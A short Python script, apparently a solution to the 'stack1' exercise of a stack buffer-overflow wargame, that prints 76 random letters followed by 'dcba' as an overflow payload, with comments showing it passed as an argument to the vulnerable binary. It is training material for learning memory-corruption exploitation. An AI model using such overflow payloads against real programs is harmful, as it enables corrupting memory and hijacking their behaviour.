import random
import string

key = ""
#print("A"*76 + "abcd")

# Returns an exploit key.
# python3 keygen_stack1.py > exploit
# ./stack1 $(cat exploit)

for i in range(76):
    key = key + random.choice(string.ascii_letters)

key = key + "dcba"

print(key)
